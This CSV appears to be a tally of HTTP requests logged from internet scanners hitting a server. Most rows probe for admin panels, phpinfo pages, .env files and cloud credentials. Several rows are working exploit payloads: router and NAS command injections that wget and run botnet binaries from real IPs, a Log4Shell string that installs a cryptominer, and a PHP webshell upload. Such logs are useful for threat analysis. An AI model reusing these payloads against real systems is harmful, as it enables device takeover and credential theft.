url,count
GET /cgi-bin/param.cgi?get_device_conf HTTP/1.1,2
GET /sqlmanager/index.php?lang=en HTTP/1.1,2
GET /_phpmyadmin_/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin_/index.php?lang=en HTTP/1.1,2
GET /config/config.json HTTP/1.1,2
GET /sql/sqlweb/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1,2
GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1,2
GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin3/index.php?lang=en HTTP/1.1,2
GET /debug/default/view HTTP/1.1,2
GET /phpmyAdmin/index.php?lang=en HTTP/1.1,2
GET /admin/db/index.php?lang=en HTTP/1.1,2
GET /db/websql/index.php?lang=en HTTP/1.1,2
GET /PMA/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin1/index.php?lang=en HTTP/1.1,2
GET /mysql/pma/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin2017/index.php?lang=en HTTP/1.1,2
GET /MyAdmin/index.php?lang=en HTTP/1.1,2
POST /index.do HTTP/1.1,2
GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1,2
POST /index.action HTTP/1.1,2
GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1,2
GET /site/.env HTTP/1.1,2
GET /mysql/pMA/index.php?lang=en HTTP/1.1,2
GET /sql/webadmin/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin/index.php?lang=en HTTP/1.1,2
GET /config/parameters.yml HTTP/1.1,2
GET /index.php?lang=en HTTP/1.1,2
GET /extra/portal/../../cgi-bin/history.sh HTTP/1.1,2
GET /protected/.env HTTP/1.1,2
GET /mysql/admin/index.php?lang=en HTTP/1.1,2
GET /admin/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1,2
GET /db/webadmin/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-latest/index.php?lang=en HTTP/1.1,2
GET /app/config/parameters.yml HTTP/1.1,2
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2Fbanthis.su%2Ft%7Csh%3B%60) HTTP/1.1,2
GET /image/digiever/login_bg1.png HTTP/1.1,2
GET /sslvpnLogin.html HTTP/1.1,2
GET /t(%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//46.8.226.196:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==%7D%27) HTTP/1.1,2
GET /aws-secret.yaml HTTP/1.1,2
GET /_profiler/phpinfo/phpinfo.php HTTP/1.1,2
GET /_profiler/phpinfo/info.php HTTP/1.1,2
GET /_phpinfo.php HTTP/1.1,2
POST /graphql HTTP/1.1,2
POST /graphql/graphiql HTTP/1.1,2
POST /graphql/graphiql.php HTTP/1.1,2
GET /phpmyadmin4/index.php?lang=en HTTP/1.1,2
POST /graphql/console HTTP/1.1,2
POST /graphql.php HTTP/1.1,2
GET /admin/login.asp HTTP/1.1,2
GET /smtp.php HTTP/1.1,2
POST /cgi-bin/system_ntp.cgi HTTP/1.1,2
GET /vendor/laravel/.env HTTP/1.1,2
GET /aab9 HTTP/1.1,2
GET /wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /web/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /xmlrpc.php?rsd HTTP/1.1,2
CONNECT proxyscrape.com:443 HTTP/1.1,2
GET /pinfo.php HTTP/1.1,2
GET /linusadmin-phpinfo.php HTTP/1.1,2
GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /index.php HTTP/1.1,2
GET /dashboard/phpinfo.php HTTP/1.1,2
POST /wsman HTTP/1.1,2
GET /smtp_config.json HTTP/1.1,2
GET /newsite/.env HTTP/1.1,2
GET /mail_config.php HTTP/1.1,2
GET /news/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /website/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /auth1.html HTTP/1.1,2
GET /sites/all/libraries/mailchimp/.env HTTP/1.1,2
GET /redmine/.env HTTP/1.1,2
GET /main/.env HTTP/1.1,2
GET /api/sonicos/auth HTTP/1.1,2
GET /dbadmin/index.php?lang=en HTTP/1.1,2
GET /api/sonicos/tfa HTTP/1.1,2
GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /site/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /test/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /?pp=env HTTP/1.1,1
GET /myadmin/index.php?lang=en HTTP/1.1,1
GET /client/.env HTTP/1.1,1
GET /Odin/http/call1729778329 HTTP/1.1,1
GET /doc/index.html HTTP/1.1,1
POST /owa/auth.owa HTTP/1.1,1
GET /admin/sysadmin/index.php?lang=en HTTP/1.1,1
GET /phpMyAdmin/index.php?lang=en HTTP/1.1,1
GET /odinhttpcall1729824607 HTTP/1.1,1
GET /shopdb/index.php?lang=en HTTP/1.1,1
GET /administrator/PMA/index.php?lang=en HTTP/1.1,1
GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1,1
GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1,1
GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1,1
GET /administrator/pma/index.php?lang=en HTTP/1.1,1
GET /odinhttpcall1729778329 HTTP/1.1,1
GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1,1
GET /OdinHttpCall1729778329 HTTP/1.1,1
GET /baseProj/images/favicon.ico HTTP/1.1,1
GET /level/15/exec/-/sh/dial-peer/voice/CR HTTP/1.1,1
POST /wp-admin/admin-ajax.php HTTP/1.1,1
GET /__tests__/test-become/.env HTTP/1.1,1
GET /index.php?act=op&pid=10 HTTP/1.1,1
POST /wp-content/plugins/simple-file-list/ee-upload-engine.php HTTP/1.1,1
POST /wp-content/plugins/simple-file-list/ee-file-engine.php HTTP/1.1,1
GET /php_configuration.php HTTP/1.1,1
GET /wp-content/uploads/simple-file-list/hdgdcad.php HTTP/1.1,1
POST /wp-admin/admin-ajax.php?+config-create+/&/<?=base64_decode($_GET[0])?>+/tmp/2nermStDgzGxVQY102l6aD6wcxd.php HTTP/1.1,1
POST /device/upgrade/check HTTP/1.0,1
POST /wp-admin/admin-ajax.php?0=Mm5lcm1WQUlNTTVkaFdETHZ2MXZzaVhsYzJU HTTP/1.1,1
CONNECT cloudflare.com:443 HTTP/1.1,1
POST /onvif/device_service HTTP/1.1,1
GET /auth/login.html HTTP/1.1,1
GET /PSIA/index HTTP/1.1,1
GET /mailman/listinfo/mailman HTTP/1.1,1
GET /database/.env HTTP/1.1,1
GET /drupal/phpinfo.php HTTP/1.1,1
GET /gists/cache HTTP/1.1,1
GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1,1
GET /phppma/index.php?lang=en HTTP/1.1,1
GET /phpmyadmin2020/index.php?lang=en HTTP/1.1,1
GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1,1
GET /mysql-admin/index.php?lang=en HTTP/1.1,1
GET /.env.live.local HTTP/1.1,1
GET /.env.defaults HTTP/1.1,1
GET /database.json HTTP/1.1,1
GET /my_env/palash.py HTTP/1.1,1
GET /wordpress/phpinfo.php HTTP/1.1,1
GET /wp/phpinfo.php HTTP/1.1,1
GET /cms/phpinfo.php HTTP/1.1,1
GET /joomla/phpinfo.php HTTP/1.1,1
GET /i.php HTTP/1.1,1
GET /info_php.php HTTP/1.1,1
GET /swt HTTP/1.1,1
GET /mysql/web/index.php?lang=en HTTP/1.1,1
GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1,1
GET /uploads/.env HTTP/1.1,1
GET /phpMyAdmin-5.2/index.php?lang=en HTTP/1.1,1
GET /lib/.env HTTP/1.1,1
GET /aws.env HTTP/1.1,1
GET /docs/.env HTTP/1.1,1
GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1,1
GET /db/webdb/index.php?lang=en HTTP/1.1,1
GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1,1
GET /phpMyAdmin6.0/index.php?lang=en HTTP/1.1,1
PUT / HTTP/1.1,1
GET http://ip-api.com/json/ HTTP/1.1,1
GET /xmlrpc.php HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F45.202.35.24%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh%3B+rm+-rf+wget.sh%60 HTTP/1.1,1
GET /.npmrc HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+mips%3B+wget+http%3A%2F%2F193.143.1.70%2Fmips.nn%3B+chmod+777+mips.nn%3B+.%2Fmips.nn+tplink%3B+rm+-rf+mips.nn%60) HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.24%2Ftplink+-O-%7C+sh%60) HTTP/1.1,1
GET /mysqladmin/index.php?lang=en HTTP/1.1,1
GET /OdinHttpCall1729824607 HTTP/1.1,1
GET /level/15/exec/-/show/configuration/CR HTTP/1.1,1
GET /slt HTTP/1.1,1
GET /login.jsp HTTP/1.1,1
GET /default.jsp HTTP/1.1,1
GET /register.jsp HTTP/1.1,1
GET /login/login.jsp HTTP/1.1,1
GET /login/indexAction.action HTTP/1.1,1
GET /indexAction.action HTTP/1.1,1
CONNECT vf555.id:443 HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://51.79.103.9/wget.sh+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://154.216.20.88/sh.sh+-O+/tmp/sh.sh;sh+sh.sh&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /odinhttpcall1732421500 HTTP/1.1,1
GET /OdinHttpCall1732421500 HTTP/1.1,1
GET /Odin/http/call1732421500 HTTP/1.1,1
GET /dashboard/.env HTTP/1.1,1
GET /.environment HTTP/1.1,1
GET /environment.conf HTTP/1.1,1
GET /.env.secrets HTTP/1.1,1
GET /main.jsp HTTP/1.1,1
GET /mail/.env HTTP/1.1,1
GET /index.action HTTP/1.1,1
GET /download/.env HTTP/1.1,1
GET /OdinHttpCall1731176849 HTTP/1.1,1
GET /Odin/http/call1731176849 HTTP/1.1,1
GET /login HTTP/1.1,1
CONNECT pro.ip-api.com:443 HTTP/1.1,1
GET /vicidial/admin.php HTTP/1.1,1
GET /cfg/000000000000.cfg HTTP/1.1,1
GET /phpconfig.php HTTP/1.1,1
GET /keybox.xml HTTP/1.1,1
GET /cgi-bin/info.cgi HTTP/1.1,1
CONNECT 153.3.238.110:443 HTTP/1.1,1
CONNECT 180.101.50.188:443 HTTP/1.1,1
GET /000000000000.cfg HTTP/1.1,1
GET /tftpboot/000000000000.cfg HTTP/1.1,1
GET /laravel/info.php HTTP/1.1,1
GET /js/.env HTTP/1.1,1
GET /index.do HTTP/1.1,1
GET /agent/timeclock.php HTTP/1.1,1
GET /?rest_route=/wp/v2/users/ HTTP/1.1,1
GET /blogs/.env HTTP/1.1,1
GET /vicidial/welcome.php HTTP/1.0,1
GET /Odin/http/call1729824607 HTTP/1.1,1
CONNECT worldsfastest.com:443 HTTP/1.1,1
GET //.local HTTP/1.1,1
GET //env HTTP/1.1,1
GET //.remote HTTP/1.1,1
GET //.production HTTP/1.1,1
GET //vendor/.env HTTP/1.1,1
GET //cronlab/.env HTTP/1.1,1
POST /login HTTP/1.1,1
GET /server HTTP/1.1,1
GET /about HTTP/1.1,1
GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1,1
GET /_all_dbs HTTP/1.1,1
GET /s/0343e2837313e2234323e2333313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1,1
GET /.env.current HTTP/1.1,1
GET /.env.php HTTP/1.1,1
GET /laravel/core/.env.local HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.138.12.63:42163/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /mailer/.env HTTP/1.1,1
GET /nginx/.env HTTP/1.1,1
GET /xampp/.env HTTP/1.1,1
GET /.docker/laravel/app/.env HTTP/1.1,1
GET /laravel/.env.local HTTP/1.1,1
GET /laravel/.env.production HTTP/1.1,1
GET /laravel/.env.staging HTTP/1.1,1
GET /laravel/core/.env.production HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F154.216.17.126%2Fl+-O-%7C+sh%60) HTTP/1.1,1
GET /laravel/core/.env.staging HTTP/1.1,1
GET /node_modules/.env HTTP/1.1,1
GET /odinhttpcall1731908421 HTTP/1.1,1
GET /OdinHttpCall1731908421 HTTP/1.1,1
GET /Odin/http/call1731908421 HTTP/1.1,1
HEAD /robots.txt HTTP/1.0,1
GET /php-configuration.php HTTP/1.1,1
GET /phpversion.php HTTP/1.1,1
GET /system_info.php HTTP/1.1,1
GET /ppinfo.php HTTP/1.1,1
GET /backend/web/phpinfo.php HTTP/1.1,1
GET /public/phpinfo.php HTTP/1.1,1
GET /tool/phpinfo.php HTTP/1.1,1
GET /backend/phpinfo.php HTTP/1.1,1
GET /admin/server_info.php HTTP/1.1,1
GET /server_info.php HTTP/1.1,1
GET /admincontrol/sys_phpinfo.php HTTP/1.1,1
GET /admin/sys_phpinfo.php HTTP/1.1,1
GET /test.php HTTP/1.1,1
GET /server-info.php HTTP/1.1,1
GET /phpinfo/config.php HTTP/1.1,1
GET /deploy.php HTTP/1.1,1
GET /developer.php HTTP/1.1,1
GET /phptest.php HTTP/1.1,1
GET /devs.php HTTP/1.1,1
GET /admin/phpinfo.php HTTP/1.1,1
GET /phpinfoposmeta.php HTTP/1.1,1
GET /php1.php HTTP/1.1,1
GET /php-info.php HTTP/1.1,1
GET /apache/info.php HTTP/1.1,1
GET /apache/phpinfo.php HTTP/1.1,1
GET /apache2.php HTTP/1.1,1
GET /build.php HTTP/1.1,1
GET /cache.php HTTP/1.1,1
GET /config/cache.php HTTP/1.1,1
GET /dashboard/i.php HTTP/1.1,1
GET /dashboard/info.php HTTP/1.1,1
GET /dashboard/test.php HTTP/1.1,1
GET /dep.php HTTP/1.1,1
GET /phpinfo4.php HTTP/1.1,1
GET /phpinfo3.php HTTP/1.1,1
GET /phpinfo2.php HTTP/1.1,1
GET /admin_phpinfo.php HTTP/1.1,1
GET /.env.sample.local HTTP/1.1,1
GET /php_info.php HTTP/1.1,1
GET /php52/phpinfo.php HTTP/1.1,1
GET /apache.php HTTP/1.1,1
GET /in.php HTTP/1.1,1
GET /inf.php HTTP/1.1,1
GET /info1.php HTTP/1.1,1
GET /info2.php HTTP/1.1,1
GET /info3.php HTTP/1.1,1
GET /info4.php HTTP/1.1,1
GET /infos.php HTTP/1.1,1
GET /of.php HTTP/1.1,1
GET /ini.php HTTP/1.1,1
GET /isadmin.php HTTP/1.1,1
GET /jo.php HTTP/1.1,1
GET /lindex.php HTTP/1.1,1
GET /main.php HTTP/1.1,1
GET /new.php HTTP/1.1,1
GET /ocp.php HTTP/1.1,1
GET /shell?cd+/tmp;rm+-rf+*;wget+http://114.219.104.198:54981/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1,1
GET /index1.php HTTP/1.1,1
GET /infophp.php HTTP/1.1,1
GET /phpcustom_info/phpinfo.php HTTP/1.1,1
GET /old_phpinfo.php HTTP/1.1,1
GET /phpinfo.html HTTP/1.1,1
GET /phpinfo.php4 HTTP/1.1,1
GET /phpinfo.txt HTTP/1.1,1
GET /phpinfo/info.php HTTP/1.1,1
GET /phpinfo/phpinfo.php HTTP/1.1,1
GET /phpinfo1.php HTTP/1.1,1
GET /phpinfodev.php HTTP/1.1,1
GET /phpinfos.php HTTP/1.1,1
GET /phpsysinfo HTTP/1.1,1
GET /phpsysinfo.php HTTP/1.1,1
GET /phpsysinfo/info.php HTTP/1.1,1
GET /phpsysinfo/phpinfo.php HTTP/1.1,1
GET /phpsysinfo/phpsysinfo.php HTTP/1.1,1
GET /php.php HTTP/1.1,1
GET /php.ini HTTP/1.1,1
GET /apache/i.php HTTP/1.1,1
GET /adminphp.php/configuration.php HTTP/1.1,1
GET /getcpuutil.php-bakworking HTTP/1.1,1
GET /sys/phpinfo.php HTTP/1.1,1
GET /staging/phpinfo.php HTTP/1.1,1
GET /test/phpinfo.php HTTP/1.1,1
GET /debug/info.php HTTP/1.1,1
GET /debug/phpinfo.php HTTP/1.1,1
GET /server/phpinfo.php HTTP/1.1,1
GET /system/phpinfo.php HTTP/1.1,1
GET /my_env/newsletter.py HTTP/1.1,1
GET /mytest/astech_robot.js HTTP/1.1,1
GET /rest.php HTTP/1.1,1
GET /partner/config/config.js HTTP/1.1,1
GET /aws/credentials HTTP/1.1,1
GET /.aws/config HTTP/1.1,1
GET /sites/default/settings.php HTTP/1.1,1
GET /config.inc.php HTTP/1.1,1
GET /.aws/configure HTTP/1.1,1
GET /development/phpinfo.php HTTP/1.1,1
GET /dev/phpinfo.php HTTP/1.1,1
GET /.aws/credentials.json HTTP/1.1,1
GET /admincp/phpinfo.php HTTP/1.1,1
GET /helper.js HTTP/1.1,1
GET /helper/EmailHelper.js HTTP/1.1,1
GET /index.js HTTP/1.1,1
GET /index.html HTTP/1.1,1
GET /my_env/chakaash.py HTTP/1.1,1
GET /laravel/phpinfo.php HTTP/1.1,1
GET /server-status/phpinfo.php HTTP/1.1,1
GET /sysinfo.php HTTP/1.1,1
GET /cp/phpinfo.php HTTP/1.1,1
GET /temp.php HTTP/1.1,1
GET /test_info.php HTTP/1.1,1
GET /admin/php_info.php HTTP/1.1,1
GET /admin_area/phpinfo.php HTTP/1.1,1
GET /administrator/phpinfo.php HTTP/1.1,1
GET /adm/phpinfo.php HTTP/1.1,1
GET /.aws/credentials.ini HTTP/1.1,1
GET /.aws/credentials.yml HTTP/1.1,1
GET /adminphp.php HTTP/1.1,1
GET /user/config/config.js HTTP/1.1,1
GET /config/local.yml HTTP/1.1,1
GET /main.yml HTTP/1.1,1
GET /backend/config/settings.yml HTTP/1.1,1
GET /api/config/config.yml HTTP/1.1,1
GET /admin/config HTTP/1.1,1
GET /appsettings.json HTTP/1.1,1
GET /shared/config/config.js HTTP/1.1,1
GET /.travis.yml HTTP/1.1,1
GET /sms.py HTTP/1.1,1
GET /symfony/_profiler/phpinfo HTTP/1.1,1
GET /.env.dist.local HTTP/1.1,1
GET /dev.php HTTP/1.1,1
GET /debug.php HTTP/1.1,1
GET /.phpinfo HTTP/1.1,1
GET /admin/info.php HTTP/1.1,1
GET /user/controllers/index.js HTTP/1.1,1
GET /config/settings.prod HTTP/1.1,1
GET /.aws/credentials.yaml HTTP/1.1,1
GET /.circleci/configs/development.yml HTTP/1.1,1
GET /aws/config.json HTTP/1.1,1
GET /aws/credentials.json HTTP/1.1,1
GET /.ebextensions/environment.config HTTP/1.1,1
GET /docker-compose.yaml HTTP/1.1,1
GET /docker-compose.dev.yml HTTP/1.1,1
GET /docker-compose.override.yml HTTP/1.1,1
GET /.docker/config.json HTTP/1.1,1
GET /database.yml HTTP/1.1,1
GET /s3.js HTTP/1.1,1
GET /server/s3.js HTTP/1.1,1
GET /helpers/utility.js HTTP/1.1,1
GET /.AWS_/credentials HTTP/1.1,1
GET /server.js HTTP/1.1,1
GET /config/settings.json HTTP/1.1,1
GET /config/settings.local HTTP/1.1,1
GET /odinhttpcall1731176849 HTTP/1.1,1
POST /goform/formJsonAjaxReq HTTP/1.1,1
GET /sites/.env HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.107.0.132:33204/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /OdinHttpCall1735573436 HTTP/1.1,1
GET /bootstrap.yml HTTP/1.1,1
GET /files/.git/config HTTP/1.1,1
GET /server/.git/config HTTP/1.1,1
GET /core/.git/config HTTP/1.1,1
GET /_profiler/empty/search/results HTTP/1.1,1
GET /app/.git/config HTTP/1.1,1
GET /security.json HTTP/1.1,1
POST /app/.env%20 HTTP/1.1,1
GET /serverless.json HTTP/1.1,1
GET /cloud-functions/config.json HTTP/1.1,1
GET /composer.json HTTP/1.1,1
GET /package.json HTTP/1.1,1
GET /yarn.lock HTTP/1.1,1
GET /npm-debug.log HTTP/1.1,1
GET /Odin/http/call1735573436 HTTP/1.1,1
GET //board.cgi?cmd=wget%20http%3A%2F%2F193.111.248.45%2FCiabins.sh HTTP/1.1,1
GET /angular-cli.json HTTP/1.1,1
GET /keys.yml HTTP/1.1,1
GET /.vscode/settings.json HTTP/1.1,1
GET /.idea/workspace.xml HTTP/1.1,1
GET /debug.log HTTP/1.1,1
GET /webpack.config.js HTTP/1.1,1
GET /webpack.dev.js HTTP/1.1,1
GET /webpack.prod.js HTTP/1.1,1
GET /.gitconfig HTTP/1.1,1
GET /auth.json HTTP/1.1,1
GET /auth.config.js HTTP/1.1,1
GET /oauth.json HTTP/1.1,1
GET /oauth2.json HTTP/1.1,1
GET /keys.json HTTP/1.1,1
GET /api-keys.json HTTP/1.1,1
GET /apikeys.json HTTP/1.1,1
GET /keys.conf HTTP/1.1,1
GET /angular.json HTTP/1.1,1
GET /react-native.config.js HTTP/1.1,1
GET /api/v2/swagger.json HTTP/1.1,1
GET /a/env HTTP/1.1,1
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwltcm93bXJvd21yb3c= HTTP/1.1,1
GET /odinhttpcall1735327901 HTTP/1.1,1
GET /cgi-bin/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwltcm93bXJvd21yb3c= HTTP/1.1,1
GET /.most/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwltcm93bXJvd21yb3c= HTTP/1.1,1
GET /cgi-bin/nas_sharing.cgi?dbg=1&cmd=15&user=messagebus&passwd=&cmd=ZWNobwltcm93bXJvd21yb3c= HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F185.157.247.35%2Fc%2Ft%7Csh%3B%60) HTTP/1.1,1
CONNECT www.liveinternet.ru:443 HTTP/1.1,1
GET /wp-content/plugins/style.php HTTP/1.1,1
GET /wp-content/style.php HTTP/1.1,1
GET /wp-admin/style.php HTTP/1.1,1
GET /administrator/index.php HTTP/1.1,1
GET /backend/env HTTP/1.1,1
GET /toumei.mp3 HTTP/1.1,1
GET /manager/actuator/env HTTP/1.1,1
POST /tC4ft HTTP/1.1,1
GET /a/actuator/env HTTP/1.1,1
GET /file/actuator/env HTTP/1.1,1
GET /functions/config.json HTTP/1.1,1
GET /file/env HTTP/1.1,1
GET /lambda/config.json HTTP/1.1,1
GET /serverless.yaml HTTP/1.1,1
GET /deploy.config.js HTTP/1.1,1
GET /odinhttpcall1735581062 HTTP/1.1,1
GET /deploy/config.json HTTP/1.1,1
GET /deployment/config.yml HTTP/1.1,1
GET /k8s/config.yml HTTP/1.1,1
GET /cache/config.json HTTP/1.1,1
GET /tmp/config.json HTTP/1.1,1
GET /serverless.yml HTTP/1.1,1
GET /app/.env%20 HTTP/1.1,1
GET /symfony/public/_profiler/phpinfo HTTP/1.1,1
GET /development/.env%20 HTTP/1.1,1
GET /backend/actuator/env HTTP/1.1,1
GET /OdinHttpCall1735327901 HTTP/1.1,1
GET /api/documentation.json HTTP/1.1,1
GET /api/v1/swagger.json HTTP/1.1,1
GET http://baidu.com/ HTTP/1.1,1
GET /tadpiflj.php?Fox=d3wL7 HTTP/1.1,1
POST /wp-plain.php HTTP/1.1,1
GET /.env.development%20 HTTP/1.1,1
GET /dev/.git/config HTTP/1.1,1
GET /dumpmdm.cmd?/login/login.html HTTP/1.1,1
GET /env HTTP/1.1,1
GET /api/actuator/env HTTP/1.1,1
GET /api/env HTTP/1.1,1
GET /admin/env HTTP/1.1,1
GET /admin/actuator/env HTTP/1.1,1
GET /Odin/http/call1732783765 HTTP/1.1,1
GET /gateway/actuator/env HTTP/1.1,1
GET /gate/actuator/env HTTP/1.1,1
GET /gate/env HTTP/1.1,1
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20209%2e136%2e48%2e69%2fmirela%3bchmod%20%2bx%20mirela%3b%2e%2fmirela;echo%20YYY;echo|%20 HTTP/1.1,1
POST /alfacgiapi/perl.alfa HTTP/1.1,1
GET /odinhttpcall1732783765 HTTP/1.1,1
GET /odinhttpcall1735573436 HTTP/1.1,1
GET /dumpcfgdynamic.cmd HTTP/1.1,1
GET /laravel/.env%20 HTTP/1.1,1
POST /laravel/.env%20 HTTP/1.1,1
POST /admin-app/.env%20 HTTP/1.1,1
GET /admin-app/.env%20 HTTP/1.1,1
GET /odinhttpcall1732847834 HTTP/1.1,1
GET /gateway/env HTTP/1.1,1
POST /.env.development%20 HTTP/1.1,1
POST /ALFA_DATA/alfacgiapi/perl.alfa HTTP/1.1,1
GET /OdinHttpCall1732783765 HTTP/1.1,1
GET /OdinHttpCall1732847834 HTTP/1.1,1
GET /Odin/http/call1732847834 HTTP/1.1,1
GET /shell?cd+/tmp;rm+-rf+*;wget+103.164.139.229/jaws;sh+/tmp/jaws HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.235.57.99:42366/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /shell?cd+/tmp;rm+-rf+*;wget+http://36.48.28.57:44338/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1,1
GET /shell?cd+/tmp;rm+-rf+*;wget+178.215.238.191/jaws;sh+/tmp/jaws HTTP/1.1,1
GET /security.yml HTTP/1.1,1
GET /dev.config.js HTTP/1.1,1
GET /api/swagger.yml HTTP/1.1,1
GET /vue.config.js HTTP/1.1,1
GET /debug/config.yml HTTP/1.1,1
GET /.envrc HTTP/1.1,1
